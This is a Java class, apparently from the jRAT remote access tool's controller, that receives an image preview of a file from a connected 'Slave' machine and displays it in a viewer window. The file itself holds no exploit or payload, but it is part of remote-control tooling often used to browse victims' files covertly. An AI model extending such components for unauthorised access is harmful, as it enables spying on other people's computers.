package jrat.module.fs.packets;

import jrat.common.utils.ImageUtils;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.AbstractIncomingPacket;
import jrat.module.fs.ui.FramePreviewImage;

import java.awt.image.BufferedImage;

public class Packet43PreviewImage extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		FramePreviewImage frame = FramePreviewImage.INSTANCES.get(slave);
		
		int imageSize = slave.readInt();

		byte[] buffer = new byte[imageSize];

		slave.getDataInputStream().readFully(buffer);

		if (frame != null) {

			BufferedImage image = ImageUtils.decodeImage(buffer);

			frame.getPanel().image = image;
			frame.getPanel().repaint();

			frame.setButtonEnabled(true);
		}
	}

}
